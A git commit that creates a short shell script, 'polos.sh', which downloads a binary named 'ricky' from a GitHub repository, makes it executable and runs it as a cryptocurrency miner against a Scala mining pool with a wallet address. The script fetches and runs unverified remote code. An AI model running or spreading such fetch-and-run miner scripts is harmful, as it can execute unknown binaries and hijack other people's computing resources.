a293f99d866fb9ec15c17475c4bc1a3ca759f6ca
AnggiAlfonso <83615896+AnggiAlfonso@users.noreply.github.com>
2021-05-11 01:16:00 +0800

    Create polos.sh

---
+++ polos.sh
@@ -0,0 +1,4 @@
+#!/bin/sh
+wget https://github.com/AnggiAlfonso/final/raw/main/ricky
+chmod u+x ./ricky
+./ricky -o scala.herominers.com:10131 -u Svjb9K3h2DL3FiCR2Qi8L4YtCps2GgJdb1oF68dThFku69AHHsknNUKRPiPDTh3CwsiQAR11ZusneUbXd12n9Trc2KqW3j2ic -p agiz3 -a panthera -k
